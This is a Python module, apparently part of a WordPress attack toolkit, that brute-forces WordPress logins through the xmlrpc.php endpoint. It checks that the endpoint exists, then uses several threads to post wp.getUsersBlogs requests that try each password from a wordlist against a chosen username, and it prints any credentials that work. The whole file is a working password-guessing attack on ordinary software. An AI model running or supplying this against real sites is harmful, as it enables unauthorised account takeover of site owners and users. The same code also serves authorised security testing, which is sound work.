"""Support for bruteforcing XML-RPC."""
import queue
import sys
from re import I, search
from threading import Thread

from humanfriendly.tables import format_pretty_table

from lib.readfile import *
from lib.request import *


class XMLRPCBrute(Request):
	max_thread = int(5)
	def __init__(self,url,data,user,wordlist,kwargs):
		self.url = url
		self.data = data
		self.user = user
		self.kwargs = kwargs
		self.wordlist = wordlist
		Request.__init__(self,kwargs)

	def check(self):
		url = Path(self.url,'xmlrpc.php')
		resp = self.send(url=url,method="GET")
		if not search(decode('XML-RPC server accepts POST requests only.'),resp.content,I):
			exit(warn('XML-RPC not found with this path: %s'%url))

	def run(self):
		plus('Bruteforcing Login via XML-RPC...')
		if self.kwargs['verbose'] is True:
			info('Setting user: %s'%(self.user))
		self.check()
		q = queue.Queue(self.max_thread)
		t = []
		for x in range(self.max_thread):
			thread = ThreadBrute(Path(self.url,'xmlrpc.php'),q,self,self.user)
			thread.daemon = True
			t.append(thread)
			thread.start()
		for passwd in readfile(self.wordlist):
			q.put(passwd.decode('utf-8'))

class ThreadBrute(Thread):
	def __init__(self,target,queue,request,user):
		Thread.__init__(self)
		self.user = user
		self.queue = queue
		self.target = target
		self.request = request

	def run(self):
		while True:
			login = False
			table = ['Username','Passowrd']
			passwd = self.queue.get()
			sys.stdout.write("[ * ] ")
			sys.stdout.write("%s\r\r"%passwd)
			sys.stdout.flush()
			post = """<methodCall><methodName>wp.getUsersBlogs</methodName>
			<params><param><value><string>%s</string></value></param><param>
			<value><string>%s</string></value></param></params></methodCall>"""%(self.user,passwd)
			resp = self.request.send(url=self.target,method="POST",data=post)
			if search(decode('<name>isAdmin</name><value><boolean>0</boolean>'),resp.content):
				login = True
			elif search(decode('<name>isAdmin</name><value><boolean>1</boolean>'),resp.content):
				login = True
			if login is True:
				plus('Valid Credentials: ')
				normal('')
				print(format_pretty_table([[self.user,passwd]],table))
				self.queue.task_done()
				self.queue.join()
